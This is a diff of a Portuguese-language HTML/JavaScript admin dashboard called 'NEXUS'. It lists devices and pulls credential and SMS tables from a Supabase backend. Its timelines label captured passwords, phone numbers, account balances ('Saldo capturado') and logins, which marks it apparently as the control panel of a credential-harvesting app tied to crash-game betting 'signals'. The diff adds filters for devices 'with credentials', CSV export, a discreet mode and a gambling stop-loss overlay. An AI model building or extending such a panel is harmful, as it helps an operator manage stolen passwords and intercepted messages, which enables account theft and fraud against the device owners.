@@ -32,7 +32,6 @@
     min-height: 100vh;
   }
 
-  /* Background grid */
   body::before {
     content: '';
     position: fixed;
@@ -45,9 +44,64 @@
     z-index: 0;
   }
 
+  /* ── MODO DISCRETO ──────────────────────────────────────── */
+  body.modo-discreto .wrap { display: none; }
+  #dot-discreto {
+    display: none;
+    position: fixed;
+    bottom: 16px;
+    right: 16px;
+    width: 14px;
+    height: 14px;
+    background: var(--accent);
+    border-radius: 50%;
+    cursor: pointer;
+    z-index: 9998;
+    box-shadow: 0 0 10px rgba(124,58,237,0.6);
+    animation: pulse-dot 2s ease-in-out infinite;
+  }
+  @keyframes pulse-dot {
+    0%,100% { box-shadow: 0 0 10px rgba(124,58,237,0.6); }
+    50% { box-shadow: 0 0 20px rgba(124,58,237,0.9), 0 0 40px rgba(124,58,237,0.4); }
+  }
+  body.modo-discreto #dot-discreto { display: block; }
+
   .wrap { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; padding: 32px 20px; }
 
-  /* Header */
+  /* ── STOP-LOSS OVERLAY ──────────────────────────────────── */
+  #stoploss-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 9000;
+    background: rgba(6,6,15,0.96);
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 20px;
+    text-align: center;
+    padding: 40px;
+  }
+  #stoploss-overlay.show { display: flex; }
+  .stoploss-icon { font-size: 64px; margin-bottom: 8px; }
+  .stoploss-title { font-size: 28px; font-weight: 800; color: #ef4444; letter-spacing: -0.5px; }
+  .stoploss-msg { font-family: var(--mono); font-size: 14px; color: var(--muted); max-width: 400px; line-height: 1.7; }
+  .stoploss-btn {
+    background: linear-gradient(135deg, #ef4444, #dc2626);
+    border: none;
+    color: white;
+    font-family: var(--sans);
+    font-size: 15px;
+    font-weight: 700;
+    padding: 14px 32px;
+    border-radius: 10px;
+    cursor: pointer;
+    margin-top: 8px;
+    letter-spacing: 0.04em;
+    transition: opacity 0.2s;
+  }
+  .stoploss-btn:hover { opacity: 0.85; }
+
   header {
     display: flex;
     align-items: center;
@@ -57,44 +111,21 @@
     border-bottom: 1px solid var(--border);
   }
 
-  .logo {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-  }
-
+  .logo { display: flex; align-items: center; gap: 12px; }
   .logo-icon {
     width: 42px; height: 42px;
     background: linear-gradient(135deg, #7c3aed, #06b6d4);
     border-radius: 12px;
     display: flex; align-items: center; justify-content: center;
-    font-size: 22px;
-    font-weight: 900;
-    color: white;
+    font-size: 22px; font-weight: 900; color: white;
     font-family: 'Syne', sans-serif;
     box-shadow: 0 0 20px rgba(124,58,237,0.4);
     letter-spacing: -1px;
   }
+  .logo h1 { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
+  .logo span { font-family: var(--mono); font-size: 11px; color: var(--accent); display: block; margin-top: 1px; }
 
-  .logo h1 {
-    font-size: 22px;
-    font-weight: 800;
-    letter-spacing: -0.5px;
-  }
-
-  .logo span {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--accent);
-    display: block;
-    margin-top: 1px;
-  }
-
-  .header-right {
-    display: flex;
-    align-items: center;
-    gap: 16px;
-  }
+  .header-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
 
   .refresh-btn {
     background: var(--surface2);
@@ -102,7 +133,7 @@
     color: var(--text);
     font-family: var(--mono);
     font-size: 12px;
-    padding: 8px 16px;
+    padding: 8px 14px;
     border-radius: 8px;
     cursor: pointer;
     transition: all 0.2s;
@@ -111,10 +142,10 @@
   .refresh-btn:hover { border-color: var(--accent); color: var(--accent); }
   .refresh-btn.loading { opacity: 0.5; pointer-events: none; }
 
-  /* Stats row */
+  /* ── STATS ──────────────────────────────────────────────── */
   .stats {
     display: grid;
-    grid-template-columns: repeat(4, 1fr);
+    grid-template-columns: repeat(5, 1fr);
     gap: 12px;
     margin-bottom: 32px;
   }
@@ -123,10 +154,13 @@
     background: var(--surface);
     border: 1px solid var(--border);
     border-radius: 12px;
-    padding: 20px;
+    padding: 16px 20px;
     transition: border-color 0.2s, box-shadow 0.2s;
+    cursor: default;
   }
   .stat:hover { border-color: rgba(124,58,237,0.4); box-shadow: 0 0 20px rgba(124,58,237,0.08); }
+  .stat.clickable { cursor: pointer; }
+  .stat.clickable:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(124,58,237,0.15); }
 
   .stat-label {
     font-family: var(--mono);
@@ -137,21 +171,72 @@
     margin-bottom: 8px;
   }
 
-  .stat-value {
-    font-size: 28px;
-    font-weight: 800;
-    line-height: 1;
-  }
-
+  .stat-value { font-size: 26px; font-weight: 800; line-height: 1; }
   .stat-value.green { color: var(--accent); }
   .stat-value.purple { color: var(--accent2); }
   .stat-value.yellow { color: var(--yellow); }
   .stat-value.red { color: var(--red); }
+  .stat-value.orange { color: #f97316; }
 
-  /* Search */
-  .search-row {
-    margin-bottom: 20px;
+  /* ── TAXA DE ACERTO ─────────────────────────────────────── */
+  .taxa-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 3px 8px;
+    border-radius: 6px;
+    font-weight: 600;
+    background: rgba(124,58,237,0.12);
+    color: var(--accent);
+    border: 1px solid rgba(124,58,237,0.25);
+    cursor: default;
+    vertical-align: middle;
+    margin-left: 8px;
   }
+
+  /* ── FILTROS AVANÇADOS ──────────────────────────────────── */
+  .filters-row {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 10px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+
+  .filter-chip {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 6px 12px;
+    border-radius: 20px;
+    cursor: pointer;
+    transition: all 0.2s;
+    user-select: none;
+    white-space: nowrap;
+  }
+  .filter-chip:hover { border-color: var(--accent); color: var(--accent); }
+  .filter-chip.active { background: rgba(124,58,237,0.15); border-color: var(--accent); color: var(--accent); }
+
+  .filter-select {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 6px 10px;
+    border-radius: 20px;
+    cursor: pointer;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .filter-select:focus { border-color: var(--accent); color: var(--text); }
+
+  /* ── SEARCH ROW ─────────────────────────────────────────── */
+  .search-row { margin-bottom: 12px; }
 
   .search-input {
     width: 100%;
@@ -171,7 +256,7 @@
   .search-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(124,58,237,0.1); }
   .search-input::placeholder { color: var(--muted); }
 
-  /* Table header */
+  /* ── TABLE HEAD com ordenação ───────────────────────────── */
   .table-head {
     display: grid;
     grid-template-columns: 1fr 140px 120px 100px 80px;
@@ -184,7 +269,19 @@
     margin-bottom: 6px;
   }
 
-  /* Device card */
+  .table-head .sortable {
+    cursor: pointer;
+    user-select: none;
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    transition: color 0.2s;
+  }
+  .table-head .sortable:hover { color: var(--accent); }
+  .table-head .sortable.asc::after { content: ' ↑'; color: var(--accent); }
+  .table-head .sortable.desc::after { content: ' ↓'; color: var(--accent); }
+
+  /* ── DEVICE CARD ────────────────────────────────────────── */
   .device-card {
     background: var(--surface);
     border: 1px solid var(--border);
@@ -193,7 +290,6 @@
     overflow: hidden;
     transition: border-color 0.2s;
   }
-
   .device-card:hover { border-color: #3a3a50; }
   .device-card.open { border-color: var(--accent); box-shadow: 0 0 0 1px rgba(124,58,237,0.2), 0 4px 24px rgba(124,58,237,0.1); }
 
@@ -219,24 +315,10 @@
     flex-shrink: 0;
   }
 
-  .device-name {
-    font-size: 14px;
-    font-weight: 700;
-    margin-bottom: 2px;
-  }
+  .device-name { font-size: 14px; font-weight: 700; margin-bottom: 2px; }
+  .device-id { font-family: var(--mono); font-size: 10px; color: var(--muted); }
 
-  .device-id {
-    font-family: var(--mono);
-    font-size: 10px;
-    color: var(--muted);
-  }
-
-  .cell {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text);
-  }
-
+  .cell { font-family: var(--mono); font-size: 12px; color: var(--text); }
   .cell.muted { color: var(--muted); font-size: 11px; }
 
   .badge {
@@ -247,26 +329,15 @@
     font-size: 10px;
     font-weight: 600;
   }
-
   .badge.active { background: rgba(0,229,160,0.12); color: var(--accent); }
   .badge.idle { background: rgba(107,107,136,0.2); color: var(--muted); }
 
-  .chevron {
-    color: var(--muted);
-    font-size: 12px;
-    transition: transform 0.2s;
-    justify-self: end;
-  }
+  .chevron { color: var(--muted); font-size: 12px; transition: transform 0.2s; justify-self: end; }
   .device-card.open .chevron { transform: rotate(180deg); color: var(--accent2); }
 
-  /* History panel */
-  .history-panel {
-    display: none;
-    border-top: 1px solid var(--border);
-    background: var(--bg);
-  }
+  /* ── HISTORY PANEL ──────────────────────────────────────── */
+  .history-panel { display: none; border-top: 1px solid var(--border); background: var(--bg); }
   .device-card.open .history-panel { display: block; }
-
   .history-inner { padding: 20px; }
 
   .history-grid {
@@ -282,7 +353,6 @@
     border-radius: 10px;
     padding: 16px;
   }
-
   .info-block h4 {
     font-family: var(--mono);
     font-size: 10px;
@@ -291,31 +361,18 @@
     letter-spacing: 1px;
     margin-bottom: 12px;
   }
-
   .info-row {
     display: flex;
     justify-content: space-between;
     align-items: center;
     margin-bottom: 8px;
   }
-
-  .info-label {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--muted);
-  }
-
-  .info-val {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text);
-    font-weight: 600;
-  }
-
+  .info-label { font-family: var(--mono); font-size: 11px; color: var(--muted); }
+  .info-val { font-family: var(--mono); font-size: 12px; color: var(--text); font-weight: 600; }
   .info-val.green { color: var(--accent); }
   .info-val.red { color: var(--red); }
 
-  /* Timeline */
+  /* ── TIMELINE ───────────────────────────────────────────── */
   .timeline-title {
     font-family: var(--mono);
     font-size: 10px;
@@ -324,7 +381,6 @@
     letter-spacing: 1px;
     margin-bottom: 14px;
   }
-
   .timeline { position: relative; padding-left: 20px; }
   .timeline::before {
     content: '';
@@ -333,7 +389,6 @@
     width: 1px;
     background: var(--border);
   }
-
   .tl-item {
     position: relative;
     margin-bottom: 14px;
@@ -341,51 +396,45 @@
     align-items: flex-start;
     gap: 12px;
   }
-
   .tl-dot {
     position: absolute;
-    left: -18px;
-    top: 4px;
+    left: -18px; top: 4px;
     width: 8px; height: 8px;
     border-radius: 50%;
     background: var(--border);
     border: 2px solid var(--bg);
   }
-
   .tl-dot.senha { background: var(--red); }
   .tl-dot.numero { background: var(--accent2); }
   .tl-dot.saldo { background: var(--accent); }
   .tl-dot.login { background: var(--yellow); }
+  .tl-time { font-family: var(--mono); font-size: 10px; color: var(--muted); white-space: nowrap; min-width: 120px; }
+  .tl-content { font-family: var(--mono); font-size: 12px; color: var(--text); }
+  .tl-content .tipo { font-size: 10px; color: var(--muted); margin-bottom: 2px; }
 
-  .tl-time {
+  /* ── SINAL HISTÓRICO ─────────────────────────────────────── */
+  .sinais-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+    gap: 8px;
+    margin-top: 10px;
+  }
+  .sinal-item {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 8px;
     font-family: var(--mono);
-    font-size: 10px;
-    color: var(--muted);
-    white-space: nowrap;
-    min-width: 120px;
-  }
-
-  .tl-content {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text);
-  }
-
-  .tl-content .tipo {
-    font-size: 10px;
-    color: var(--muted);
-    margin-bottom: 2px;
-  }
-
-  /* Empty / loading */
-  .empty {
+    font-size: 11px;
     text-align: center;
-    padding: 60px 20px;
-    color: var(--muted);
-    font-family: var(--mono);
-    font-size: 13px;
   }
+  .sinal-item.acerto { border-color: rgba(124,58,237,0.4); background: rgba(124,58,237,0.08); }
+  .sinal-item.prot { border-color: rgba(6,182,212,0.4); background: rgba(6,182,212,0.06); }
+  .sinal-item.erro { border-color: rgba(239,68,68,0.3); background: rgba(239,68,68,0.06); }
+  .sinal-item.pendente { opacity: 0.5; }
 
+  /* ── EMPTY / LOADING ─────────────────────────────────────── */
+  .empty { text-align: center; padding: 60px 20px; color: var(--muted); font-family: var(--mono); font-size: 13px; }
   .spinner {
     width: 20px; height: 20px;
     border: 2px solid var(--border);
@@ -394,7 +443,6 @@
     animation: spin 0.7s linear infinite;
     margin: 0 auto 12px;
   }
-
   @keyframes spin { to { transform: rotate(360deg); } }
 
   @media (max-width: 700px) {
@@ -403,31 +451,42 @@
     .device-row { grid-template-columns: 1fr auto; gap: 8px; }
     .cell.hide-mobile { display: none; }
     .history-grid { grid-template-columns: 1fr; }
+    .filters-row { gap: 6px; }
   }
 </style>
 </head>
 <body>
 
+<!-- DOT MODO DISCRETO -->
+<div id="dot-discreto" onclick="toggleModoDiscreto()" title="Clica para restaurar o painel"></div>
+
+<!-- STOP-LOSS OVERLAY -->
+<div id="stoploss-overlay">
+  <div class="stoploss-icon">🛑</div>
+  <div class="stoploss-title">SESSÃO ENCERRADA</div>
+  <div class="stoploss-msg" id="stoploss-msg">O limite de stop-loss foi atingido. A sessão foi bloqueada para proteger a tua banca.</div>
+  <button class="stoploss-btn" onclick="confirmarStoploss()">Confirmo — Encerrar sessão</button>
+</div>
+
 <!-- 🔐 OVERLAY DE LOGIN -->
 <div id="login-overlay" style="position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:9999;background:var(--bg);">
   <div style="position:absolute;inset:0;background:radial-gradient(ellipse 70% 60% at 30% 20%,rgba(124,58,237,0.15) 0%,transparent 60%),radial-gradient(ellipse 50% 40% at 70% 80%,rgba(6,182,212,0.10) 0%,transparent 60%);pointer-events:none"></div>
-  <div style="position:relative;z-index:1;background:var(--surface);border:1px solid var(--border2);border-radius:20px;padding:44px 40px;width:100%;max-width:380px;box-shadow:0 0 0 1px rgba(124,58,237,0.1),0 32px 80px rgba(0,0,0,0.6)">
+  <div style="position:relative;z-index:1;background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:44px 40px;width:100%;max-width:380px;box-shadow:0 0 0 1px rgba(124,58,237,0.1),0 32px 80px rgba(0,0,0,0.6)">
     <div style="text-align:center;margin-bottom:36px">
       <div style="width:62px;height:62px;background:linear-gradient(135deg,#7c3aed,#06b6d4);border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:900;color:#fff;margin:0 auto 16px;box-shadow:0 0 0 1px rgba(124,58,237,0.4),0 0 40px rgba(124,58,237,0.4);font-family:var(--sans)">N</div>
       <h2 style="font-family:var(--sans);font-size:24px;font-weight:800;letter-spacing:2px;color:var(--text)">NEXUS</h2>
-      <p style="font-family:var(--mono);font-size:11px;color:var(--text3);margin-top:6px;letter-spacing:0.06em">Painel de Controlo</p>
+      <p style="font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:6px;letter-spacing:0.06em">Painel de Controlo</p>
     </div>
-    <label style="display:block;font-family:var(--mono);font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:8px">Senha de Acesso</label>
+    <label style="display:block;font-family:var(--mono);font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:8px">Senha de Acesso</label>
     <input id="login-input" type="password" placeholder="••••••••"
-      style="width:100%;padding:13px 16px;background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius-sm);color:var(--text);font-family:var(--mono);font-size:14px;outline:none;box-sizing:border-box;margin-bottom:16px;transition:border-color 0.2s,box-shadow 0.2s"
+      style="width:100%;padding:13px 16px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--mono);font-size:14px;outline:none;box-sizing:border-box;margin-bottom:16px;transition:border-color 0.2s,box-shadow 0.2s"
       onkeypress="if(event.key==='Enter')fazerLogin(document.getElementById('login-input').value)"
       onfocus="this.style.borderColor='var(--accent)';this.style.boxShadow='0 0 0 3px rgba(124,58,237,0.15)'"
-      onblur="this.style.borderColor='var(--border2)';this.style.boxShadow='none'">
+      onblur="this.style.borderColor='var(--border)';this.style.boxShadow='none'">
     <button onclick="fazerLogin(document.getElementById('login-input').value)"
-      style="width:100%;padding:13px;background:linear-gradient(135deg,#7c3aed,#06b6d4);border:none;border-radius:var(--radius-sm);color:#fff;font-family:var(--sans);font-size:14px;font-weight:700;cursor:pointer;letter-spacing:0.04em;transition:opacity 0.2s,transform 0.1s"
-      onmouseover="this.style.opacity='0.9';this.style.transform='translateY(-1px)'"
-      onmouseout="this.style.opacity='1';this.style.transform='translateY(0)'">Entrar</button>
-    <div id="login-error-msg" style="color:var(--red);font-family:var(--mono);font-size:11px;margin-top:10px;text-align:center;min-height:16px"></div>
+      style="width:100%;padding:13px;background:linear-gradient(135deg,#7c3aed,#06b6d4);border:none;border-radius:8px;color:#fff;font-family:var(--sans);font-size:14px;font-weight:700;cursor:pointer;letter-spacing:0.04em;transition:opacity 0.2s,transform 0.1s"
+      onmouseover="this.style.opacity='0.9'" onmouseout="this.style.opacity='1'">Entrar</button>
+    <div id="login-error-msg" style="color:#ef4444;font-family:var(--mono);font-size:11px;margin-top:10px;text-align:center;min-height:16px"></div>
   </div>
 </div>
 
@@ -437,11 +496,22 @@
     <div class="logo">
       <div class="logo-icon">N</div>
       <div>
-        <h1>NEXUS</h1>
+        <h1>NEXUS
+          <!-- Taxa de acerto visível no header -->
+          <span class="taxa-badge" id="taxa-badge" title="Taxa de acerto da sessão">✓ —</span>
+        </h1>
         <span>painel de utilizadores</span>
       </div>
     </div>
     <div class="header-right">
+      <!-- Modo Discreto -->
+      <button class="refresh-btn" onclick="toggleModoDiscreto()" title="Minimiza o painel a um ponto — útil durante o jogo">
+        <span>👁</span> Discreto
+      </button>
+      <!-- Exportar CSV -->
+      <button class="refresh-btn" onclick="exportarCSV()" title="Exportar lista de dispositivos como CSV">
+        <span>⬇</span> CSV
+      </button>
       <button class="refresh-btn" onclick="carregarComToken()">
         <span>↻</span> Actualizar
       </button>
@@ -451,6 +521,7 @@
     </div>
   </header>
 
+  <!-- STATS — 5 cards (+ desactualizados) -->
   <div class="stats">
     <div class="stat">
       <div class="stat-label">Total Dispositivos</div>
@@ -468,9 +539,14 @@
       <div class="stat-label">Com Credenciais</div>
       <div class="stat-value red" id="stat-creds">—</div>
     </div>
+    <!-- NOVO: contador de desactualizados — clicável para filtrar -->
+    <div class="stat clickable" id="stat-desact-card" onclick="filtrarDesactualizados()" title="Clica para filtrar dispositivos desactualizados">
+      <div class="stat-label">Desactualizados</div>
+      <div class="stat-value orange" id="stat-desact">—</div>
+    </div>
   </div>
 
-  <!-- Mini gráfico de actividade + botão push -->
+  <!-- Mini gráfico + acções remotas -->
   <div style="display:grid;grid-template-columns:1fr auto;gap:12px;margin-bottom:24px;align-items:stretch">
     <div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px">
       <div style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px">Actividade últimos 7 dias</div>
@@ -482,14 +558,39 @@
     </div>
   </div>
 
+  <!-- SEARCH -->
   <div class="search-row">
-    <input class="search-input" type="text" placeholder="Pesquisar por número, modelo, device_id..." oninput="filtrar(this.value)" id="search">
+    <input class="search-input" type="text" placeholder="Pesquisar por número, modelo, device_id, versão, país..." oninput="aplicarFiltros()" id="search">
   </div>
 
+  <!-- FILTROS AVANÇADOS -->
+  <div class="filters-row" id="filters-row">
+    <span style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-right:4px">Filtrar:</span>
+    <span class="filter-chip active" data-filter="todos" onclick="setFiltroEstado('todos',this)">Todos</span>
+    <span class="filter-chip" data-filter="activos" onclick="setFiltroEstado('activos',this)">✅ Activos hoje</span>
+    <span class="filter-chip" data-filter="inativos" onclick="setFiltroEstado('inativos',this)">⛔ Inactivos</span>
+    <span class="filter-chip" data-filter="comcreds" onclick="setFiltroEstado('comcreds',this)">🔑 Com credenciais</span>
+    <span class="filter-chip" data-filter="desact" id="chip-desact" onclick="setFiltroEstado('desact',this)">⚠️ Desactualizados</span>
+    <!-- Filtro por versão -->
+    <select class="filter-select" id="filter-versao" onchange="aplicarFiltros()" title="Filtrar por versão">
+      <option value="">Todas as versões</option>
+    </select>
+    <!-- Filtro por modelo -->
+    <select class="filter-select" id="filter-modelo" onchange="aplicarFiltros()" title="Filtrar por modelo">
+      <option value="">Todos os modelos</option>
+    </select>
+  </div>
+
+  <!-- RESULTADOS -->
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+    <div id="resultado-label" style="font-family:var(--mono);font-size:11px;color:var(--muted)"></div>
+  </div>
+
+  <!-- TABLE HEAD com ordenação -->
   <div class="table-head">
-    <div>Dispositivo</div>
-    <div>Versão</div>
-    <div>Último Acesso</div>
+    <div><span class="sortable" onclick="ordenarPor('modelo')">Dispositivo</span></div>
+    <div><span class="sortable" onclick="ordenarPor('versao')">Versão</span></div>
+    <div><span class="sortable" onclick="ordenarPor('ultimo_acesso')">Último Acesso</span></div>
     <div>Número</div>
     <div></div>
   </div>
@@ -511,14 +612,27 @@ const headers = {
 };
 
 let todosDispositivos = [];
-let todasCredenciais = [];
-let todasSMS = [];
+let todasCredenciais  = [];
+let todasSMS          = [];
 
-async function fetchJSON(table) {
-  const r = await fetch(SUPA_URL + "/rest/v1/" + table + "?select=*&limit=1000", { headers });
-  if (!r.ok) throw new Error("HTTP " + r.status);
-  return r.json();
-}
+// ── ESTADO DOS FILTROS & ORDENAÇÃO ────────────────────────────────────
+let filtroEstado = "todos";
+let sortCampo    = "ultimo_acesso";
+let sortDir      = "desc";   // "asc" | "desc"
+let versaoAtual  = "";       // versão mais recente (para comparar desactualizados)
+
+// ── HISTÓRICO DE SINAIS (armazenado localmente por sessão) ────────────
+// Formato: { ts, prot, alcMin, alcMax, conf, crashReal, protOk, alcOk }
+let historicoSinais = JSON.parse(localStorage.getItem("nexus_sinais") || "[]");
+
+// ── STOP-LOSS ─────────────────────────────────────────────────────────
+let bancaSessao = parseFloat(localStorage.getItem("nexus_banca") || "0");
+let lucroSessao = parseFloat(localStorage.getItem("nexus_lucro") || "0");
+const STOPLOSS_PCT = 20; // −20% da banca inicial
+
+// ════════════════════════════════════════════════════════════════════════
+// UTILITÁRIOS
+// ════════════════════════════════════════════════════════════════════════
 
 function formatDate(str) {
   if (!str) return "—";
@@ -530,16 +644,12 @@ function isHoje(str) {
   if (!str) return false;
   const d = new Date(str);
   const hoje = new Date();
-  // Comparar em hora local (não UTC) para evitar desfasamento de fuso horário
-  return d.getFullYear() === hoje.getFullYear() &&
-         d.getMonth()    === hoje.getMonth()    &&
-         d.getDate()     === hoje.getDate();
+  return d.getFullYear()===hoje.getFullYear() && d.getMonth()===hoje.getMonth() && d.getDate()===hoje.getDate();
 }
 
 function isSemana(str) {
   if (!str) return false;
-  const d = new Date(str);
-  return (Date.now() - d.getTime()) < 7 * 24 * 60 * 60 * 1000;
+  return (Date.now() - new Date(str).getTime()) < 7 * 24 * 60 * 60 * 1000;
 }
 
 function getEmoji(modelo) {
@@ -548,19 +658,13 @@ function getEmoji(modelo) {
   if (m.includes("samsung")) return "📱";
   if (m.includes("xiaomi") || m.includes("redmi")) return "📱";
   if (m.includes("iphone")) return "🍎";
-  if (m.includes("huawei")) return "📱";
-  if (m.includes("oppo")) return "📱";
   return "📱";
 }
 
 function getTipoLabel(tipo) {
   const map = {
-    "senha_nova": "🔑 Senha alterada",
-    "numero_novo": "📞 Número alterado",
-    "saldo": "💰 Saldo capturado",
-    "login": "🔓 Login efectuado",
-    "senha": "🔑 Senha",
-    "numero": "📞 Número",
+    "senha_nova":"🔑 Senha alterada","numero_novo":"📞 Número alterado","saldo":"💰 Saldo capturado",
+    "login":"🔓 Login efectuado","senha":"🔑 Senha","numero":"📞 Número"
   };
   return map[tipo] || "📌 " + tipo;
 }
@@ -572,39 +676,270 @@ function getTipoDot(tipo) {
   return "login";
 }
 
-async function carregar() { await carregarDados(); }
+// ════════════════════════════════════════════════════════════════════════
+// STATS
+// ════════════════════════════════════════════════════════════════════════
 
 function actualizarStats() {
-  const total = todosDispositivos.length;
-  const hoje = todosDispositivos.filter(d => isHoje(d.ultimo_acesso)).length;
-  const semana = todosDispositivos.filter(d => isSemana(d.ultimo_acesso)).length;
-  const comCreds = new Set(todasCredenciais.filter(c => c.device_id).map(c => c.device_id)).size;
+  const total   = todosDispositivos.length;
+  const hoje    = todosDispositivos.filter(d => isHoje(d.ultimo_acesso)).length;
+  const semana  = todosDispositivos.filter(d => isSemana(d.ultimo_acesso)).length;
+  const comCreds= new Set(todasCredenciais.filter(c => c.device_id).map(c => c.device_id)).size;
 
-  document.getElementById("stat-total").textContent = total;
-  document.getElementById("stat-hoje").textContent = hoje;
+  // Detectar versão mais recente
+  const versoes = todosDispositivos.map(d => d.versao).filter(Boolean);
+  versaoAtual = versoes.sort((a,b) => {
+    const toN = v => v.split(".").map(Number).reduce((acc,n,i) => acc + n * Math.pow(100, 2-i), 0);
+    return toN(b) - toN(a);
+  })[0] || "";
+  const desact = versaoAtual ? todosDispositivos.filter(d => d.versao && d.versao !== versaoAtual).length : 0;
+
+  document.getElementById("stat-total").textContent  = total;
+  document.getElementById("stat-hoje").textContent   = hoje;
   document.getElementById("stat-semana").textContent = semana;
-  document.getElementById("stat-creds").textContent = comCreds;
+  document.getElementById("stat-creds").textContent  = comCreds;
+  document.getElementById("stat-desact").textContent = desact;
+
+  // Atualizar dropdowns de filtro
+  actualizarDropdowns();
+
+  // Taxa de acerto
+  actualizarTaxaAcerto();
+
+  // Stop-loss check
+  verificarStoploss();
 }
+
+function actualizarDropdowns() {
+  const versoes = [...new Set(todosDispositivos.map(d => d.versao).filter(Boolean))].sort((a,b)=>{
+    const toN = v => v.split(".").map(Number).reduce((acc,n,i)=>acc+n*Math.pow(100,2-i),0);
+    return toN(b)-toN(a);
+  });
+  const modelos = [...new Set(todosDispositivos.map(d => d.modelo).filter(Boolean))].sort();
+
+  const selV = document.getElementById("filter-versao");
+  const selM = document.getElementById("filter-modelo");
+  const vAtual = selV.value;
+  const mAtual = selM.value;
+
+  selV.innerHTML = '<option value="">Todas as versões</option>' + versoes.map(v =>
+    `<option value="${v}"${v===versaoAtual?` style="color:var(--accent)"`:""} ${v===vAtual?"selected":""}>${v}${v===versaoAtual?" (última)":""}</option>`
+  ).join("");
+  selM.innerHTML = '<option value="">Todos os modelos</option>' + modelos.map(m =>
+    `<option value="${m}" ${m===mAtual?"selected":""}>${m}</option>`
+  ).join("");
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// TAXA DE ACERTO VISÍVEL
+// ════════════════════════════════════════════════════════════════════════
+
+function actualizarTaxaAcerto() {
+  const comResultado = historicoSinais.filter(s => s.crashReal != null);
+  const badge = document.getElementById("taxa-badge");
+  if (!badge) return;
+  if (comResultado.length === 0) { badge.textContent = "✓ —"; return; }
+  const acertos = comResultado.filter(s => s.alcOk).length;
+  const taxa = Math.round(acertos / comResultado.length * 100);
+  badge.textContent = `✓ ${acertos}/${comResultado.length}`;
+  badge.title = `Taxa de acerto: ${taxa}% (${acertos} acertos em ${comResultado.length} sinais)`;
+  badge.style.background = taxa >= 60 ? "rgba(124,58,237,0.15)" : taxa >= 40 ? "rgba(249,115,22,0.12)" : "rgba(239,68,68,0.12)";
+  badge.style.color = taxa >= 60 ? "var(--accent)" : taxa >= 40 ? "#f97316" : "#ef4444";
+  badge.style.borderColor = taxa >= 60 ? "rgba(124,58,237,0.3)" : taxa >= 40 ? "rgba(249,115,22,0.3)" : "rgba(239,68,68,0.3)";
+}
+
+// Registar sinal (chamado pelo utilizador ou importado do app via Supabase)
+function registarSinal(prot, alcMin, alcMax, confianca) {
+  historicoSinais.push({ ts: Date.now(), prot, alcMin, alcMax, confianca, crashReal: null, protOk: null, alcOk: null });
+  if (historicoSinais.length > 50) historicoSinais = historicoSinais.slice(-50);
+  localStorage.setItem("nexus_sinais", JSON.stringify(historicoSinais));
+  actualizarTaxaAcerto();
+}
+
+function registarResultadoSinal(crashReal) {
+  // Associar ao sinal mais recente sem resultado
+  const pendente = [...historicoSinais].reverse().find(s => s.crashReal == null);
+  if (!pendente) return;
+  pendente.crashReal = crashReal;
+  pendente.protOk = crashReal >= pendente.prot;
+  pendente.alcOk  = crashReal >= pendente.alcMin;
+  localStorage.setItem("nexus_sinais", JSON.stringify(historicoSinais));
+  actualizarTaxaAcerto();
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// STOP-LOSS BLOQUEANTE
+// ════════════════════════════════════════════════════════════════════════
+
+function verificarStoploss() {
+  if (bancaSessao <= 0) return;
+  const limite = bancaSessao * STOPLOSS_PCT / 100;
+  if (lucroSessao <= -limite) {
+    const overlay = document.getElementById("stoploss-overlay");
+    document.getElementById("stoploss-msg").textContent =
+      `Perdeste ${Math.abs(lucroSessao).toFixed(0)} AOA (${STOPLOSS_PCT}% da banca de ${bancaSessao.toFixed(0)} AOA). A sessão foi bloqueada automaticamente para proteger a tua banca.`;
+    overlay.classList.add("show");
+  }
+}
+
+function confirmarStoploss() {
+  document.getElementById("stoploss-overlay").classList.remove("show");
+  lucroSessao = 0;
+  localStorage.setItem("nexus_lucro", "0");
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// MODO DISCRETO
+// ════════════════════════════════════════════════════════════════════════
+
+let modoDiscreto = false;
+function toggleModoDiscreto() {
+  modoDiscreto = !modoDiscreto;
+  document.body.classList.toggle("modo-discreto", modoDiscreto);
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// ORDENAÇÃO
